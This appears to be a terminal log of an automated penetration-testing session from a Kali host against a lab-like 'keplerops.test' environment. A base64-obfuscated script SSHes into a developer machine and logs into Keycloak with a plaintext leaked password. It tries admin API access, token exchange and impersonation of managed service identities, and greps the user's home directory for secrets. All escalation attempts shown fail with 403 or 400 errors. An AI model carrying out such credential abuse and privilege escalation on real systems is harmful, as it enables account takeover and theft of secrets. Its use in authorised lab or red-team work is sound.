@@ -1,0 +1,116 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/p15.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKQj1odHRwczovL3N0YWZmLmtlcGxlcm9wcy50ZXN0CklEPWh0dHBzOi8vaWRlbnRpdHkua2VwbGVyb3BzLnRlc3QKVE9LPSRJRC9yZWFsbXMva2VwbGVyb3BzL3Byb3RvY29sL29wZW5pZC1jb25uZWN0L3Rva2VuCmV4cG9ydCBLUkI1Q0NOQU1FPS90bXAva3JiNWNjX2syMQplY2hvICIjIyMjIyMjIyBrZXljbG9hayB0b2tlbiBkZWNvZGUiClJFU1A9JChjdXJsIC1zU2sgLW0gMTAgLS1jYWNlcnQgJENBIC1YIFBPU1QgLWQgJ2NsaWVudF9pZD1hZG1pbi1jbGknIC1kICdncmFudF90eXBlPXBhc3N3b3JkJyAtZCAndXNlcm5hbWU9cm93YW4uaXRvJyAtLWRhdGEtdXJsZW5jb2RlICdwYXNzd29yZD1ma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8nICIkVE9LIikKZWNobyAiJFJFU1AiIHwgaGVhZCAtYyA0MDA7IGVjaG8KS1Q9JChlY2hvICIkUkVTUCIgfCBweXRob24zIC1jICdpbXBvcnQganNvbixzeXM7cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbikuZ2V0KCJhY2Nlc3NfdG9rZW4iLCIiKSknKQpweXRob24zIC0gIiRLVCIgPDwnUFknCmltcG9ydCBzeXMsYmFzZTY0LGpzb24KdD1zeXMuYXJndlsxXS5zcGxpdCgnLicpWzFdCnQrPSc9JyooLWxlbih0KSU0KQpwcmludChqc29uLmR1bXBzKGpzb24ubG9hZHMoYmFzZTY0LnVybHNhZmVfYjY0ZGVjb2RlKHQpKSxpbmRlbnQ9MSlbOjMwMDBdKQpQWQplY2hvICIjIyMjIyMjIyB1c2VyaW5mbyIKY3VybCAtc1NrIC1tIDEwIC0tY2FjZXJ0ICRDQSAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRLVCIgLXcgJ1xuWyV7aHR0cF9jb2RlfV1cbicgIiRJRC9yZWFsbXMva2VwbGVyb3BzL3Byb3RvY29sL29wZW5pZC1jb25uZWN0L3VzZXJpbmZvIiB8IGhlYWQgLWMgODAwCmVjaG8gIiMjIyMjIyMjIGFkbWluIFJFU1QgY2xpZW50cyIKY3VybCAtc1NrIC1tIDEwIC0tY2FjZXJ0ICRDQSAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRLVCIgLXcgJ1xuWyV7aHR0cF9jb2RlfV1cbicgIiRJRC9hZG1pbi9yZWFsbXMva2VwbGVyb3BzL2NsaWVudHM/Y2xpZW50SWQ9T0lEQy1GSUVMREtFU1QtU1VQUE9SVCIgfCBoZWFkIC1jIDEyMDAKZWNobzsgY3VybCAtc1NrIC1tIDEwIC0tY2FjZXJ0ICRDQSAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRLVCIgLXcgJ1xuWyV7aHR0cF9jb2RlfV1cbicgIiRJRC9hZG1pbi9yZWFsbXMva2VwbGVyb3BzL3VzZXJzP3VzZXJuYW1lPXJvd2FuLml0byIgfCBoZWFkIC1jIDEyMDAKZWNobyAiIyMjIyMjIyMgdG9rZW4gZXhjaGFuZ2UiCmZvciBhdWQgaW4gT0lEQy1GSUVMREtFU1QtU1VQUE9SVCBmaWVsZGtlc3Qtc3VwcG9ydCBhY2NvdW50OyBkbwogIGVjaG8gIi0tLSBhdWQ9JGF1ZCIKICBjdXJsIC1zU2sgLW0gMTAgLS1jYWNlcnQgJENBIC1YIFBPU1QgLWQgJ2NsaWVudF9pZD1hZG1pbi1jbGknIC1kICdncmFudF90eXBlPXVybjppZXRmOnBhcmFtczpvYXV0aDpncmFudC10eXBlOnRva2VuLWV4Y2hhbmdlJyAtZCAnc3ViamVjdF90b2tlbl90eXBlPXVybjppZXRmOnBhcmFtczpvYXV0aDp0b2tlbi10eXBlOmFjY2Vzc190b2tlbicgLS1kYXRhLXVybGVuY29kZSAic3ViamVjdF90b2tlbj0kS1QiIC1kICdyZXF1ZXN0ZWRfdG9rZW5fdHlwZT11cm46aWV0ZjpwYXJhbXM6b2F1dGg6dG9rZW4tdHlwZTphY2Nlc3NfdG9rZW4nIC1kICJhdWRpZW5jZT0kYXVkIiAtdyAnXG5bJXtodHRwX2NvZGV9XVxuJyAiJFRPSyIgfCBoZWFkIC1jIDgwMApkb25lCmVjaG8gIiMjIyMjIyMjIGdyZXAgcm93YW4gZmlsZXMgZm9yIE9JREMvcmVnaXN0cmF0aW9uL3NlY3JldCIKZ3JlcCAtcmluIC0tZXhjbHVkZS1kaXI9LmNvbmZpZyAtLWV4Y2x1ZGUtZGlyPS5jYWNoZSAnT0lEQ1x8Y2xpZW50X3NlY3JldFx8cmVnaXN0cmF0aW9uXHxGRURFUkFUSU9OJyAvaG9tZS9yb3dhbiAyPi9kZXYvbnVsbCB8IGhlYWQgLTIwCmVjaG8gIiMjIyMjIyMjIGtlcmJlcm9zIG1hbmFnZWQgaWRlbnRpdGllcyBsaXN0IgplY2hvICdma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8nIHwga2luaXQgcm93YW4uaXRvIDI+L2Rldi9udWxsCmZvciBzaWQgaW4gYXNzaXN0YW50IGFzc2lzdGFudC5rZXBsZXJvcHMudGVzdCBmaWVsZGtlc3QtYXNzaXN0YW50IHN1cHBvcnQtYXNzaXN0YW50IHN1cHBvcnQtcHJpdmF0ZSBzdXBwb3J0IGZpZWxka2VzdC1zdXBwb3J0IE9JREMtRklFTERLRVNULVNVUFBPUlQgd29ya3NwYWNlIGZpZWxkbGluay13b3Jrc3BhY2Ugb2JqZWN0cyBjbG91ZC1hcGkgZGF0YTsgZG8KICBlY2hvICItLS0gJHNpZCIKICBjdXJsIC1zU2sgLW0gOCAtLWNhY2VydCAkQ0EgLS1uZWdvdGlhdGUgLXUgOiAtWCBQT1NUIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgLXcgJ1xuWyV7aHR0cF9jb2RlfV1cbicgIiRCL2FwaS9tYW5hZ2VkLWlkZW50aXRpZXMvJHNpZC9zZXNzaW9uIiB8IGhlYWQgLWMgNDAwCmRvbmUKa2Rlc3Ryb3kgMj4vZGV2L251bGwKSU5ORVIKZWNobyBET05FX01BUktfJFJBTkRPTQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/p15.sh; bash /tmp/p15.sh; echo DONEMARK_1795202339184$((6*7))
+######## keycloak token decode
+{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJoV1BJdjgxUXVSaGthZWZ2Z1hGSzdvRDVlMWNDclFUNFQzNVhCS01Kc3dvIn0.eyJleHAiOjE3OTUyMDI2NDgsImlhdCI6MTc5NTIwMjM0OCwianRpIjoib25sdHJvOjFkOGZhYjA2LWUwN2EtNmJkZS02YmI5LWE1ZWYzM2M1ZDRlNyIsImlzcyI6Imh0dHBzOi8vaWRlbnRpdHkua2VwbGVyb3BzLnRlc3QvcmVhbG1zL2tlcGxlcm9wcyIsInR5cCI6IkJlYXJlciIsImF6cCI6ImFkbWluLWNsaSIsInNpZCI6IjRiYzQzOGYwLWRiYWYtYjk0YS1
+{
+ "exp": 1795202648,
+ "iat": 1795202348,
+ "jti": "onltro:1d8fab06-e07a-6bde-6bb9-a5ef33c5d4e7",
+ "iss": "https://identity.keplerops.test/realms/keplerops",
+ "typ": "Bearer",
+ "azp": "admin-cli",
+ "sid": "4bc438f0-dbaf-b94a-bfee-f78727531dd5",
+ "scope": "email profile"
+}
+######## userinfo
+
+[403]
+######## admin REST clients
+{"error":"HTTP 403 Forbidden"}
+[403]
+
+{"error":"HTTP 403 Forbidden"}
+[403]
+######## token exchange
+--- aud=OIDC-FIELDKEST-SUPPORT
+{"error":"invalid_request","error_description":"Standard token exchange is not enabled for the requested client"}
+[400]
+--- aud=fieldkest-support
+{"error":"invalid_request","error_description":"Standard token exchange is not enabled for the requested client"}
+[400]
+--- aud=account
+{"error":"invalid_request","error_description":"Standard token exchange is not enabled for the requested client"}
+[400]
+######## grep rowan files for OIDC/registration/secret
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:20:	WellKnownWget service account issuer OpenID configuration, also known as the 'OIDC discovery doc'**getServiceAccountIssuerOpenIDConfiguration2application/jsonJ7
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6837:#/apis/admissionregistration.k8s.io/��
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6838:admissionregistrationget information of a group* getAdmissionregistrationAPIGroup2application/json2application/yaml2#application/vnd.kubernetes.protobuf:application/json:application/yaml:#application/vnd.kubernetes.protobufJi
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6849:&/apis/admissionregistration.k8s.io/v1/��
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6850:admissionregistration_v1get available resources*&getAdmissionregistrationV1APIResources2application/json2application/yaml2#application/vnd.kubernetes.protobuf:application/json:application/yaml:#application/vnd.kubernetes.protobufJp
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6861:?/apis/admissionregistration.k8s.io/v1/mutatingadmissionpolicies�#�
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6862:admissionregistration_v15list or watch objects of kind MutatingAdmissionPolicy*2listAdmissionregistrationV1MutatingAdmissionPolicy2application/json2application/yaml2#application/vnd.kubernetes.protobuf2application/json;stream=watch20application/vnd.kubernetes.protobuf;stream=watch:*/*B-+
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6879:M#/definitions/io.k8s.api.admissionregistration.v1.MutatingAdmissionPolicyList
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6886:x-kubernetes-group-version-kindPNgroup: admissionregistration.k8s.io
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6890:admissionregistration_v1 create a MutatingAdmissionPolicy*4createAdmissionregistrationV1MutatingAdmissionPolicy2application/json2application/yaml2#application/vnd.kubernetes.protobuf:*/*B_
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6893:I#/definitions/io.k8s.api.admissionregistration.v1.MutatingAdmissionPolicyB�
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6902:I#/definitions/io.k8s.api.admissionregistration.v1.MutatingAdmissionPolicy
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6908:I#/definitions/io.k8s.api.admissionregistration.v1.MutatingAdmissionPolicy
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6914:I#/definitions/io.k8s.api.admissionregistration.v1.MutatingAdmissionPolicy
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6921:x-kubernetes-group-version-kindPNgroup: admissionregistration.k8s.io
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6926:admissionregistration_v1,delete collection of MutatingAdmissionPolicy*>deleteAdmissionregistrationV1CollectionMutatingAdmissionPolicy2application/json2application/yaml2#application/vnd.kubernetes.protobuf:*/*B
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6954:x-kubernetes-group-version-kindPNgroup: admissionregistration.k8s.io
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6959:F/apis/admissionregistration.k8s.io/v1/mutatingadmissionpolicies/{name}�-�
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6960:admissionregistration_v1*read the specified MutatingAdmissionPolicy*2readAdmissionregistrationV1MutatingAdmissionPolicy2application/json2application/yaml2#application/vnd.kubernetes.protobuf:*/*Jw
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:6966:I#/definitions/io.k8s.api.admissionregistration.v1.MutatingAdmissionPolicy
+######## kerberos managed identities list
+Password for rowan.ito@KEPLEROPS.TEST: 
+--- assistant
+{"error":"managed_identity_denied"}
+
+[403]
+--- assistant.keplerops.test
+{"error":"managed_identity_denied"}
+
+[403]
+--- fieldkest-assistant
+{"error":"managed_identity_denied"}
+
+[403]
+--- support-assistant
+{"error":"managed_identity_denied"}
+
+[403]
+--- support-private
+{"error":"managed_identity_denied"}
+
+[403]
+--- support
+{"error":"managed_identity_denied"}
+
+[403]
+--- fieldkest-support
+{"error":"managed_identity_denied"}
+
+[403]
+--- OIDC-FIELDKEST-SUPPORT
+{"error":"managed_identity_denied"}
+
+[403]
+--- workspace
+{"error":"managed_identity_denied"}
+
+[403]
+--- fieldlink-workspace
+{"error":"managed_identity_denied"}
+
+[403]
+--- objects
+{"error":"managed_identity_denied"}
+
+[403]
+--- cloud-api
+{"error":"managed_identity_denied"}
+
+[403]
+--- data
+{"error":"managed_identity_denied"}
+
+[403]
+DONE_MARK_11955
